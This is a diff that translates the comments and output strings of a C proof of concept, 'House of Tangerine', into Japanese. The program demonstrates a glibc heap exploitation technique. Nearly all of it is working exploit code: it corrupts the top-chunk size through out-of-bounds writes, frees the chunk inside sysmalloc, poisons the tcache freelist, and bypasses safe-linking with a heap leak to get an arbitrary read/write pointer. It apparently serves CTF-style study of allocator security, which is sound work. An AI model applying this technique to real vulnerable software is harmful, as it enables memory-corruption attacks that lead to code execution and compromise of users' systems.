@@ -9,83 +9,83 @@
 #define SIZE_SZ sizeof(size_t)
 
 #define CHUNK_HDR_SZ (SIZE_SZ*2)
-// same for x86_64 and x86
+// x86_64 と x86 で共通です
 #define MALLOC_ALIGN 0x10L
 #define MALLOC_MASK (-MALLOC_ALIGN)
 
 #define PAGESIZE sysconf(_SC_PAGESIZE)
 #define PAGE_MASK (PAGESIZE-1)
 
-// fencepost are offsets removed from the top before freeing
+// fencepost は、解放する前に top から取り除かれるオフセットです
 #define FENCEPOST (2*CHUNK_HDR_SZ)
 
 #define PROBE (0x20-CHUNK_HDR_SZ)
 
-// size used for poisoned tcache
+// poison された tcache に使うサイズ
 #define CHUNK_SIZE_1 0x40
 #define SIZE_1 (CHUNK_SIZE_1-CHUNK_HDR_SZ)
 
-// could also be split into multiple lower size allocations
+// より小さい複数の確保に分割することもできます
 #define CHUNK_SIZE_3 (PAGESIZE-(2*MALLOC_ALIGN)-CHUNK_SIZE_1)
 #define SIZE_3 (CHUNK_SIZE_3-CHUNK_HDR_SZ)
 
 /**
- * Tested on GLIBC 2.34 (x86_64, x86 & aarch64) & 2.39 (x86_64, x86 & aarch64)
+ * GLIBC 2.34 (x86_64, x86, aarch64) と 2.39 (x86_64, x86, aarch64) でテストしています
  *
- * House of Tangerine is the modernized version of House of Orange
- * and is able to corrupt heap without needing to call free() directly
+ * House of Tangerine は House of Orange を現代化したもので、
+ * free() を直接呼ばなくてもヒープを破壊できます
  *
- * it uses the _int_free call to the top_chunk (wilderness) in sysmalloc
+ * sysmalloc 内で top_chunk (wilderness) に対して行われる _int_free の呼び出しを利用します
  * https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L2913
  *
- * tcache-poisoning is used to trick malloc into returning a malloc aligned arbitrary pointer
- * by abusing the tcache freelist. (requires heap leak on and after 2.32)
+ * tcache-poisoning を使い、tcache の freelist を悪用して、malloc をだまして
+ * malloc のアラインメントに合った任意のポインタを返させます。(2.32 以降ではヒープのリークが必要です)
  *
- * this version expects a positive and negative OOB (e.g. BOF)
- * or a positive OOB in editing a previous chunk
+ * このバージョンは、正方向と負方向の OOB (例: BOF)、
+ * または前のチャンクを編集する際の正方向の OOB を前提としています
  *
- * This version requires 5 (6*) malloc calls and 3 OOB
+ * このバージョンは、malloc 呼び出しが 5 回 (6 回*)、OOB が 3 回必要です
  *
- *  *to make the PoC more reliable we need to malloc and probe the current top chunk size,
- *  this should be predictable in an actual exploit and therefore, can be removed to get 5 malloc calls instead
+ *  *PoC をより確実にするために、malloc して現在の top chunkのサイズを調べる必要があります。
+ *  実際のエクスプロイトでは予測できるはずなので、これを省いて malloc 呼び出しを 5 回にできます
  *
- * Special Thanks to pepsipu for creating the challenge "High Frequency Troubles"
- * from Pico CTF 2024 that inspired this exploitation technique
+ * Pico CTF 2024 の問題 "High Frequency Troubles" を作成し、
+ * この攻略技法のきっかけを与えてくれた pepsipu に特に感謝します
  */
 int main() {
   size_t size_2, *top_size_ptr, top_size, new_top_size, freed_top_size, vuln_tcache, target, *heap_ptr;
   long win[2] __attribute__ ((aligned (0x10)));
-  // disable buffering
+  // バッファリングを無効にします
   setvbuf(stdout, NULL, _IONBF, 0);
   setvbuf(stdin, NULL, _IONBF, 0);
   setvbuf(stderr, NULL, _IONBF, 0);
 
-  // check if all chunks sizes are aligned
+  // すべてのチャンクサイズがアラインされているか確認します
   assert((CHUNK_SIZE_1 & MALLOC_MASK) == CHUNK_SIZE_1);
   assert((CHUNK_SIZE_3 & MALLOC_MASK) == CHUNK_SIZE_3);
 
-  puts("Constants:");
-  printf("chunk header = 0x%lx\n", CHUNK_HDR_SZ);
-  printf("malloc align = 0x%lx\n", MALLOC_ALIGN);
-  printf("page align = 0x%lx\n", PAGESIZE);
-  printf("fencepost size = 0x%lx\n", FENCEPOST);
+  puts("定数:");
+  printf("チャンクヘッダ = 0x%lx\n", CHUNK_HDR_SZ);
+  printf("malloc のアラインメント = 0x%lx\n", MALLOC_ALIGN);
+  printf("ページのアラインメント = 0x%lx\n", PAGESIZE);
+  printf("fencepost のサイズ = 0x%lx\n", FENCEPOST);
   printf("size_1 = 0x%lx\n", SIZE_1);
 
-  printf("target tcache top size = 0x%lx\n", CHUNK_HDR_SZ + MALLOC_ALIGN + CHUNK_SIZE_1);
+  printf("対象の tcache 先頭のサイズ = 0x%lx\n", CHUNK_HDR_SZ + MALLOC_ALIGN + CHUNK_SIZE_1);
 
-  // target is malloc aligned 0x10
-  // since this patch in glibc-2.42: https://patchwork.sourceware.org/project/glibc/patch/20250206213709.2394624-2-benjamin.p.kallus.gr@dartmouth.edu/
-  // the size of the target chunk must be set
+  // target は malloc のアラインメント 0x10 に合わせます。
+  // glibc-2.42 の次のパッチ以降: https://patchwork.sourceware.org/project/glibc/patch/20250206213709.2394624-2-benjamin.p.kallus.gr@dartmouth.edu/
+  // 対象チャンクの size を設定する必要があります
   target = (size_t) &win[0];
   win[1] = 0x41;
 
-  // probe the current size of the top_chunk,
-  // can be skipped if it is already known or predictable
+  // top_chunk の現在のサイズを調べます。
+  // すでに分かっている場合や予測できる場合は省略できます
   heap_ptr = malloc(PROBE);
   top_size = heap_ptr[(PROBE / SIZE_SZ) + 1];
-  printf("first top size = 0x%lx\n", top_size);
+  printf("最初の top のサイズ = 0x%lx\n", top_size);
 
-  // calculate size_2
+  // size_2 を計算します
 
   size_2 = top_size - CHUNK_HDR_SZ - (2 * MALLOC_ALIGN) - CHUNK_SIZE_1;
   size_2 &= PAGE_MASK;
@@ -94,81 +94,81 @@ int main() {
 
   printf("size_2 = 0x%lx\n", size_2);
 
-  // first allocation 
+  // 最初の確保
   heap_ptr = malloc(size_2);
 
-  // use BOF or OOB to corrupt the top_chunk
+  // BOF または OOB を使って top_chunk を破壊します
   top_size_ptr = &heap_ptr[(size_2 / SIZE_SZ) - 1 + (MALLOC_ALIGN / SIZE_SZ)];
 
   top_size = *top_size_ptr;
 
-  printf("first top size = 0x%lx\n", top_size);
+  printf("最初の top のサイズ = 0x%lx\n", top_size);
 
-  // make sure corrupt top size is page aligned, generally 0x1000
+  // 破壊した top の size がページにアラインされている(一般には 0x1000)ようにします
   // https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L2599
   new_top_size = top_size & PAGE_MASK;
   *top_size_ptr = new_top_size;
-  printf("new first top size = 0x%lx\n", new_top_size);
+  printf("新しい最初の top のサイズ = 0x%lx\n", new_top_size);
 
-  // remove fencepost from top_chunk, to get size that will be freed
+  // top_chunk から fencepost を取り除き、解放されるサイズを求めます
   // https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L2895
   freed_top_size = (new_top_size - FENCEPOST) & MALLOC_MASK;
   assert(freed_top_size == CHUNK_SIZE_1);
 
   /*
-   * malloc (larger than available_top_size), to free previous top_chunk using _int_free.
-   * This happens inside sysmalloc, where the top_chunk gets freed if it can't be merged
+   * available_top_size より大きい malloc を行い、_int_free を使って以前の top_chunk を解放します。
+   * これは sysmalloc の内部で起こり、top_chunk は併合できない場合に解放されます
    * https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L2913
-   * we prevent the top_chunk from being merged by lowering its size
-   * we can also circumvent corruption checks by keeping PAGE_MASK bits unchanged
+   * top_chunk の size を小さくすることで、併合されないようにします
+   * また、PAGE_MASK のビットを変えないことで、破壊チェックも回避できます
    */
 
   printf("size_3 = 0x%lx\n", SIZE_3);
   heap_ptr = malloc(SIZE_3);
 
   top_size = heap_ptr[(SIZE_3 / SIZE_SZ) + 1];
-  printf("current top size = 0x%lx\n", top_size);
+  printf("現在の top のサイズ = 0x%lx\n", top_size);
 
-  // make sure corrupt top size is page aligned, generally 0x1000
+  // 破壊した top の size がページにアラインされている(一般には 0x1000)ようにします
   new_top_size = top_size & PAGE_MASK;
   heap_ptr[(SIZE_3 / SIZE_SZ) + 1] = new_top_size;
-  printf("new top size = 0x%lx\n", new_top_size);
+  printf("新しい top のサイズ = 0x%lx\n", new_top_size);
 
-  // remove fencepost from top_chunk, to get size that will be freed
+  // top_chunk から fencepost を取り除き、解放されるサイズを求めます
   freed_top_size = (new_top_size - FENCEPOST) & MALLOC_MASK;
-  printf("freed top_chunk size = 0x%lx\n", freed_top_size);
+  printf("解放された top_chunk のサイズ = 0x%lx\n", freed_top_size);
 
   assert(freed_top_size == CHUNK_SIZE_1);
 
-  // free the previous top_chunk
+  // 以前の top_chunk を解放します
   heap_ptr = malloc(SIZE_3);
 
-  // this will be our vuln_tcache for tcache poisoning
+  // これが tcache poisoning に使う vuln_tcache になります
   vuln_tcache = (size_t) &heap_ptr[(SIZE_3 / SIZE_SZ) + 2];
 
-  printf("tcache next ptr: 0x%lx\n", vuln_tcache);
+  printf("tcache の next ポインタ: 0x%lx\n", vuln_tcache);
 
-  // do the above again to free one more chunk so that we can moves chunks from smallbin to tcache
-  printf("repeat the above process and obtain one more free chunk\n");
+  // 上の手順をもう一度行い、チャンクをもう 1 つ解放して、small bin から tcache へチャンクを移せるようにします
+  printf("上の手順を繰り返して、空きチャンクをもう 1 つ得ます\n");
   top_size = heap_ptr[(SIZE_3 / SIZE_SZ) + 1];
   new_top_size = top_size & PAGE_MASK;
   heap_ptr[(SIZE_3 / SIZE_SZ) + 1] = new_top_size;
-  heap_ptr = malloc(SIZE_3); // do the free
-  printf("Now, one more allocation will move the other two chunks to tcache\n");
-  void *pad = malloc(SIZE_1); // allocate one chunk from smallbin to move other chunks to tcache
+  heap_ptr = malloc(SIZE_3); // 解放を実行します
+  printf("これで、もう 1 回確保すると、残りの 2 つのチャンクが tcache に移ります\n");
+  void *pad = malloc(SIZE_1); // small bin から 1 つチャンクを確保して、他のチャンクを tcache に移します
 
-  printf("Finally, we can do tcache poisoning.\n");
-  // corrupt next ptr into pointing to target
-  // use a heap leak to bypass safe linking (GLIBC >= 2.32)
+  printf("これで、tcache poisoning を行えます。\n");
+  // next ポインタを破壊して、target を指すようにします
+  // ヒープのリークを使って safe-linking を回避します (GLIBC 2.32 以降)
   heap_ptr[(vuln_tcache - (size_t) heap_ptr) / SIZE_SZ] = target ^ (vuln_tcache >> 12);
 
-  // allocate first tcache (corrupt next tcache bin)
+  // 最初の tcache を確保します(次の tcache bin が破壊されています)
   heap_ptr = malloc(SIZE_1);
 
-  // get arbitrary ptr for reads or writes
+  // 読み書き用の任意のポインタを得ます
   heap_ptr = malloc(SIZE_1);
 
-  // proof that heap_ptr now points to the same string as target
+  // heap_ptr が target と同じ文字列を指すようになったことの確認
   assert((size_t) heap_ptr == target);
-  puts("Success! During the whole process, we didn't use the free() function.");
+  puts("成功です! 全体を通して、free() 関数は一度も使っていません。");
 }
